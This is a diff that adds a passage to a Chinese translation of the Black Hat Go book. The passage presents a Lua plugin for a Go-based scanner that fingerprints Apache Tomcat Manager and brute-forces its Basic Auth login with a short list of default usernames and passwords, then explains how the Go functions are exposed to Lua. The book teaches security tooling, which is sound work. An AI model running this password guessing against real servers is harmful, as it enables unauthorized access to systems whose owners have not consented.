@@ -415,3 +415,40 @@ func main() {
 清单 10-7: 注册并调用 Lua 插件 (https://github.com/blackhat-go/bhg/ch-10/lua-core/cmd/scanner/main.go/)
 
 如同在Go的例子中的 `main()` 函数，硬编码了加载插件的路径。在 `main()` 函数中，调用 `lua.NewState()` 创建 ` *lua.LState` 实例。`lua.NewState()` 实例是设置Lua VM的关键项，注册函数和类型，并且执行任意的Lua脚本。然后将该指针传递给之前创建的 `register()` 函数，该函数在状态上注册自定义的http名称空间和函数。读取插件目录中的内容，循环遍历目录的每一个文件。对每一个文件调用 `l.DoFile(f)` ，`f` 是文件的绝对路径。这个调用在注册自定义类型和函数的Lua状态中执行文件的内容。本质上，`DoFile()` 是`gopher-lua` 执行整个文件的方式，就好像执行独立的Lua脚本一样。
+
+### 创建插件脚本
+
+现在让我们看一下用Lua编写的Tomcat插件脚本（清单 10-8）。
+
+```lua
+usernames = {"admin", "manager", "tomcat"}
+passwords = {"admin", "manager", "tomcat", "password"}
+
+status, basic, err = http.head("10.0.1.20", 8080, "/manager/html")
+if err ~= "" then
+    print("[!] Error: "..err)
+    return
+end
+if status ~= 401 or not basic then
+    print("[!] Error: Endpoint does not require Basic Auth. Exiting.")
+    return
+end
+print("[+] Endpoint requires Basic Auth. Proceeding with password guessing")
+for i, username in ipairs(usernames) do
+    for j, password in ipairs(passwords) do
+        status, basic, err = http.get("10.0.1.20", 8080, username, password, "/manager/html")
+        if status == 200 then
+            print("[+] Found creds - "..username..":"..password)
+            return
+        end
+    end
+end
+```
+
+清单 10-8: Tomcat 密码猜测Lua插件 (https://github.com/blackhat-go/bhg/ch-10/lua-core/plugins/tomcat.lua/)
+
+不必太担心漏洞检查逻辑。实际上和用Go所创建的插件的逻辑一样的；通过使用HEAD请求对应用程序进行指纹识别后，它将对Tomcat Manager门户执行基本的密码猜测。着重说两个有趣的地方。
+
+第一个调用 ` http.head("10.0.1.20", 8080, "/manager/html")` 。根据在状态元表上的全局和字段注册，可以对 `http.head()` 函数发出调用，而不会收到Lua错误。另外，提供了 `head()` 函数从 `LState` 实例读取的三个参数。Lua调用需要三个返回值，它们与退出Go函数之前压栈到 `LState` 的数字和类型一致。
+
+第二个是调用 `http.get()` ，和调用 `http.head()` 相似。唯一不同的地方是传递用户名和密码给 `http.get()` 函数。如果参考用Go实现的 `get()` 函数，也是从 `LState` 实例中读取这两个额外的字符串。
